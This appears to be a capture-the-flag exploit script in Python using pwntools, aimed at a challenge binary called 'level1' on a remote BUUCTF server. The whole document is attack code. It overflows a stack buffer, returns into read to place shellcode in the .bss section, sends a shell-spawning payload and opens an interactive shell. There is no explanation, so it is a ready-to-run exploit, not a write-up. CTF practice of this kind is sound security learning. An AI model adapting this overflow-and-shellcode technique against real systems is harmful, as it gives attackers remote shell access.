from pwn import *
r = remote('node3.buuoj.cn',29463)
elf = ELF('./level1')
payload = 0x8c*'a'+p32(elf.plt['read'])+p32(elf.bss())+p32(0)+p32(elf.bss())+p32(0x100)
r.sendline(payload)
r.sendline(asm(shellcraft.sh()))
r.interactive()
